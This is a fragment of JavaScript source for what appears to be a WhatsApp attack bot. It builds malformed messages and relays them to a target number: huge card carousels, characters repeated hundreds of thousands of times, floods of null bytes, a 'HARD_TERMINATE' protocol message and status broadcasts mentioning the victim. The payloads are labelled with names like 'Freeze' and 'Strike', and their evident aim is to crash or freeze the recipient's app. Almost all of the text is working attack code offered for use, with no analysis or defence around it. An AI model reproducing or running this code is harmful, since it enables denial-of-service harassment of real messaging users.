              mentionedJid: ["0@s.whatsapp.net"]
            }
          }
        },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };

      await sock.relayMessage(target, cv.message, {
        messageId: null,
        participant: { jid: target }
      });

      await wait(10);

      await sock.relayMessage(target, cv.message, {
        messageId: null,
        participant: { jid: target }
      });

      await wait(750);
    }

    await sock.relayMessage(target, {
      "videoMessage": {
        "url": "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
        "mimetype": "video/mp4",
        "fileSha256": "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
        "fileLength": "175891",
        "seconds": 1,
        "mediaKey": "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
        "height": 848,
        "width": 480,
        "fileEncSha256": "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
        "directPath": "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
        "mediaKeyTimestamp": "1765345955",
        "streamingSidecar": "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
        "annotations": [{
          "shouldSkipConfirmation": true,
          "embeddedContent": {
            "embeddedMusic": {
              "musicContentMediaId": "3312808138872179",
              "songId": "270259430421407",
              "author": "ြ".repeat(200000),
              "title": " Freeze ",
              "artworkDirectPath": "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
              "artworkSha256": "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
              "artworkEncSha256": "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
              "artistAttribution": "",
              "countryBlocklist": "",
              "isExplicit": true,
              "artworkMediaKey": "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
              "musicSongStartTimeInMs": "10149",
              "derivedContentStartTimeInMs": "0",
              "overlapDurationInMs": "1000"
            }
          },
          "embeddedAction": true
        }]
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    });

    await wait(500);

    const imageMessage = {
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
      fileLength: 162903,
      height: 1080,
      width: 1080,
      mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
      fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
      directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
      mediaKeyTimestamp: 1775033718,
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
      contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA" },
      scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
      scanLengths: [ 10365, 39303, 40429, 72806 ],
      midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
    };

    let cards2 = [];
    for (let z = 0; z < 5000; z++) {
      cards2.push({
        header: { imageMessage, hasMediaAttachment: true },
        nativeFlowMessage: { messageParamsJson: "\0" }
      });
    }

    const firstMsg = {
      key: { remoteJid: target, fromMe: true, id: Math.random().toString(36).substring(2, 15) },
      message: {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: { text: "\0" },
              carouselMessage: { cards: cards2 }
            }
          }
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    const secondMsg = {
      key: { remoteJid: target, fromMe: true, id: Math.random().toString(36).substring(2, 15) },
      message: {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "\0" },
              carouselMessage: { cards: cards2 }
            }
          }
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    const thirdMsg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "KAZZ", format: "DEFAULT" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(150000), id: null })
                }
              ],
              version: 3
            }
          }
        }
      }
    };

    await sock.relayMessage(target, firstMsg.message, { participant: { jid: target } });
    await sock.relayMessage(target, secondMsg.message, { participant: { jid: target } });
    await sock.relayMessage(target, thirdMsg, { participant: { jid: target } });

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          protocolMessage: {
            type: 25,
            key: { remoteJid: target, fromMe: true, id: "HARD_TERMINATE" }
          }
        }
      }
    }, { participant: { jid: target } });

    await sock.relayMessage("status@broadcast", {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: { text: "\u0000".repeat(500000), format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(9999999),
              version: 3
            }
          }
        }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    console.log(`Done: ${target}`);

  } catch (error) {
    console.error(error.message);
  }
}

async function VnXNewOnlyBulldo(sock, target) {
  const MsgNew = {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
            text: "\0".repeat(250000) + "\n".repeat(25000) + "\u0000".repeat(250000),
        }
      }
    }
  };

  try {
    await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
    console.log('message success to ${target}');
  } catch (e) {
    console.log("❌ Error Strike:", e);
  }
}

bot.launch()